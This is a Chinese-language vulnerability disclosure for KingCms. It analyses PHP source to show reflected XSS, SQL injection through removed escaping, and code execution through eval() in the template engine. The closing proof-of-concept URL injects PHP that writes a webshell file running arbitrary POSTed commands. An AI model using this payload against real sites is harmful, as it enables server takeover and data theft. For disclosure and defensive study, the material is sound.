@@ -1,0 +1,170 @@
+KingCms Multiple Vulnerabilities 
+
+漏洞详情
+
+披露状态：
+
+
+
+2012-07-11： 积极联系厂商并且等待厂商认领中，细节不对外公开
+2012-08-25： 厂商已经主动忽略漏洞，细节向公众公开
+
+
+简要描述：
+
+SQL注入加+代码执行
+
+详细说明：
+
+function kc_pageLoad(){
+	if (KC_MAGIC_QUOTES_GPC){
+		$_GET=kc_stripslashes_array($_GET);
+		$_POST=kc_stripslashes_array($_POST);
+		$_COOKIE=kc_stripslashes_array($_COOKIE);
+		$array=array('PHP_SELF','SCRIPT_URI','QUERY_STRING','PATH_INFO','PATH_TRANSLATED');
+		foreach($array as $val){
+			if(isset($_SERVER[$val]))
+				$_SERVER[$val]=htmlspecialchars($_SERVER[$val]);
+                                //这里程序员考虑到了跨站的问题
+                           例如：我们提交一个 fuca.php/"><script>alert(/Samy/)</script>
+                              就导致一个反射型XSS
+ 
+		}
+	}
+
+	//设置ismethod值 true:post ; false:get
+	$ismethod=kc_post('METHOD') ? True : False;
+	$GLOBALS['ismethod']=!($_SERVER['REQUEST_METHOD']=='GET' || $ismethod);
+}
+
+
+function kc_stripslashes_array(&$_data){
+	if (is_array($_data)){
+		foreach ($_data as $_key => $_value){
+			$_data[$_key]=kc_stripslashes_array($_value);
+		}
+		return $_data;
+	}else{
+		return stripslashes($_data);
+	}
+}
+
+ decode addslashes 呵
+ 
+程序在去掉转义字符的同时.也为我们的注入带来方便
+ 
+因此程序员也写了一个函数 来获取GET 和 POST数组的值 并调用kc_validate
+ 
+用正则表达式来匹配我们提交的值：
+ 
+
+function kc_get($name,$type=2,$is=0){
+	global $king;
+
+	$val=isset($_GET[$name]) ? $_GET[$name] :'';
+	if(!isset($val{0}))
+		$val=isset($_POST[$name]) ? $_POST[$name] : '';
+	if(isset($val{0})){
+		if(kc_validate($val,$type)){
+			$_getid=$val;
+		}else{
+			kc_error($king->lang->get
+                 略....
+
+kc_validate
+
+
+function kc_validate($s,$_type){
+	switch($_type){
+		case 1:$_reg='/^[a-zA-Z0-9]+$/';break;
+		case 2:$_reg='/^[0-9]+$/';break;
+		case 3:$_reg='/^([0-9\.]+\,?)+$/';break;
+		case 4:$_reg='/^[A-Za-z0-9\_]+$/';break;
+		case 5:
+			$_reg='/^\w+([-+.]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*$/';break;
+		case 6:
+			//$_reg='/^(http|https|ftp):(\/\/|\\\\)(([\w\/\\\+\-~`@:%])+\.)+([\w\/\.\=\?\+\-~`@\:!%#]|(&)|&)+/';
+			$_reg='/^[a-zA-Z]{3,10}:\/\/[^\s]+$/';
+			break;
+		case 7:
+			global $king;
+//			$_bool=in_array(kc_f_ext($s),explode('|',$king->config('upimg')));
+//			retrun $_bool;
+			$_reg='/^([a-zA-Z]{3,10}:\/\/)?[^\s]+\.('.$king->config('upimg').')$/';
+			//$_reg='/^((http|https|ftp):(\/\/|\\\\)(([\w\/\\\+\-~`@:%])+\.)+([\w\/\.\=\?\+\-~`@\:!%#]|(&)|&)+|([\w\/\\\.\=\?\+\-~`@\':!%#]|(&)|&)+)\.('.$king->config('upimg').')$/';
+			break;//jpeg|jpg|gif|png|bmp
+		case 8:
+			$_reg='/^((((1[6-9]|[2-9]\d)\d{2})-(0?[13578]|1[02])-(0?[1-9]|[12]\d|3[01]))|(((1[6-9]|[2-9]\d)\d{2})-(0?[13456789]|1[012])-(0?[1-9]|[12]\d|30))|(((1[6-9]|[2-9]\d)\d{2})-0?2-(0?[1-9]|1\d|2[0-8]))|(((1[6-9]|[2-9]\d)(0[48]|[2468][048]|[13579][26])|((16|[2468][048]|[3579][26])00))-0?2-29)) (20|21|22|23|[0-1]?\d):[0-5]?\d:[0-5]?\d$/';break;
+		case 9:
+			$_reg='/^((((1[6-9]|[2-9]\d)\d{2})-(0?[13578]|1[02])-(0?[1-9]|[12]\d|3[01]))|(((1[6-9]|[2-9]\d)\d{2})-(0?[13456789]|1[012])-(0?[1-9]|[12]\d|30))|(((1[6-9]|[2-9]\d)\d{2})-0?2-(0?[1-9]|1\d|2[0-8]))|(((1[6-9]|[2-9]\d)(0[48]|[2468][048]|[13579][26])|((16|[2468][048]|[3579][26])00))-0?2-29))$/';break;
+		case 10:$_reg='/^\d?\.\d?\.\d{4}$/';break;
+		case 13:$_reg='/^#?[0-9A-Fa-f]{6}$/';break;
+		default:$_reg=$_type;
+		case 22:$_reg='/^\-?[0-9]+$/';break;
+		case 23:$_reg='/^[a-zA-Z][a-zA-Z0-9\_]*/';break;
+		case 24:$_reg='/^[a-zA-Z0-9-_]+$/';break;
+		case 25:$_reg='/[a-zA-Z0-9\+\%]+(\=)*$/';break;
+		case 33:$_reg='/^(\-?[0-9]+\,?)+$/';break;
+		default:$_reg=$_type;
+             略..
+
+ 
+代码执行：
+ 
+$tmp=$t ? $t : $this->tmp;
+	if(substr($tmp,0,6)=='{Tags}'){
+		$s='<div style="border:5px solid #CCC;background:#EFEEEE;padding:15px;line-height:20px;">';
+		foreach($this->array as $key => $val){
+			$s.="<tt>{king:$key/}</tt> -&gt; $val <br/>";
+		}
+		$s.='</div>';
+
+	}else{
+		kc_runtime('Template');
+
+		$s=preg_replace_callback($this->parent,array(&$this,'regexcallback'),$tmp);
+
+		kc_runtime('Template',1);
+
+	}
+
+
+
+	$parent='/<\?(php)?(\S*?)((.|\n)+?)\?>/is';
+
+	$s=preg_replace_callback($parent,array(&$this,'regexphpcallback'),$s);
+
+	return $s;
+public function regexphpcallback($m){
+	$php=$m[3];
+
+	if(isset($php)){
+		ob_start();
+		eval($php);
+		$s=ob_get_clean();
+	}
+
+	return $s;
+}
+
+漏洞证明：
+
+由于id进入了Path中 我们提交l999999.9 or 1=1 会生成
+ 
+
+
+
+
+
+由于是从mysql中读值.我们无法控制. 不能构造webshell了
+ 
+
+
+
+
+
+
+代码执行：
+ 
+http://localhost/king/search.php?query=facked';?><?fputs(fopen('Samy.php','w'),base64_decode('MTExPD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4yMjI='));?>&modelid=1 or 2=2
+
